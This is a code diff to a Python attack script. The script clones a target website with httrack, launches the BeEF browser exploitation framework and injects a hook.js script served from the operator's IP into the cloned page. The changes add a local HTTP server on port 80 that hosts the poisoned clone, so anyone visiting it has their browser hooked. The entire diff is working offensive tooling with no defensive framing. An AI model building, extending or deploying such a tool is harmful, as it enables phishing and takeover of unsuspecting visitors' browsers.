@@ -16,6 +16,9 @@ import os;
 import subprocess;
 from subprocess import check_output;
 import fileinput;
+import http.server
+import socketserver
+import os
 
 
 
@@ -72,27 +75,22 @@ def ArgCheck(arg):
             return x; #Return the position of the argument
     return False; #Else, return False
 
+def execute(cmd):
+    popen = subprocess.Popen(cmd, stdout=subprocess.PIPE, universal_newlines=True)
+    for stdout_line in iter(popen.stdout.readline, ""):
+        yield stdout_line
+    popen.stdout.close()
+    return_code = popen.wait()
+    if return_code:
+        raise subprocess.CalledProcessError(return_code, cmd)
+
 def WebsiteClone(url, folder): #httrack usage - 'httrack <URL> -O <FOLDER>'
-    instance = subprocess.Popen(["httrack", url, "-O", folder], stdout=subprocess.PIPE);
-    while True:
-        output = instance.stdout.readline();
-        if output == '' and instance.poll() is not None:
-            break;
-        if output:
-            print(output.strip());
-    rc = instance.poll();
-    return rc;
+    for path in execute(["httrack", url, "-O", folder]):
+        print(path, end="");
 
 def BeEFStart():
-    instance = subprocess.Popen(["sudo", "beef-xss"], stdout=subprocess.PIPE)
-    while True:
-        output = instance.stdout.readline()
-        if output == '' and instance.poll() is not None:
-            break
-        if output:
-            print(output.strip())
-    rc = instance.poll()
-    return rc
+    for path in execute(["sudo", "beef-xss"]):
+        print(path, end="");
 
 def fileInject(hookIP, url, outputFolder):
     beefString = ("http://%s:3000/hook.js" % hookIP)
@@ -100,7 +98,9 @@ def fileInject(hookIP, url, outputFolder):
         cutDownUrl = url.replace("https://", "");
     elif "http://" in url:
         cutDownUrl = url.replace("http://", "");
-    filepath = ("%s/%s/index.html" % (outputFolder, cutDownUrl))
+    global webFilepath;
+    webFilepath = ("%s/%s/" % (outputFolder, cutDownUrl))
+    filepath = ("%s/%s/index.html" % (outputFolder, cutDownUrl));
     file = open(filepath, "r");
     filedata = file.read();
     file.close()
@@ -108,6 +108,19 @@ def fileInject(hookIP, url, outputFolder):
     file = open(filepath, "w");
     file.write(filedata);
     file.close()
+
+def httpHost():
+    port = 80;
+    os.chdir(webFilepath)
+
+    Handler = http.server.SimpleHTTPRequestHandler;
+    httpd = socketserver.TCPServer(("", port), Handler);
+    try:
+        httpd.serve_forever();
+    except KeyboardInterrupt:
+        pass;
+        httpd.server_close();
+
 
 
 
@@ -139,10 +152,14 @@ elif "-u" in sys.argv:
             print("\nFinished Cloning");
             print("\nNow starting beef-xss.");
             BeEFStart();
+            print("\nInjecting the BeEF hook")
             fileInject(localIP, url, outputFolder);
+            print("\nStarting the http server")
+            httpHost();
         elif "-p" not in sys.argv:
             #Local IP for beef-xss error
-    elif "-o" not in sys.argv:
-        print("%sError: no output path specified%s" % (colour_header.red, colour_header.white)); #Throw error
+            print("error")
+        elif "-o" not in sys.argv:
+            print("%sError: no output path specified%s" % (colour_header.red, colour_header.white)); #Throw error
 elif "-u" not in sys.argv:
     print("%sError: no URL specified%s" % (colour_header.red, colour_header.white)); #Throw error
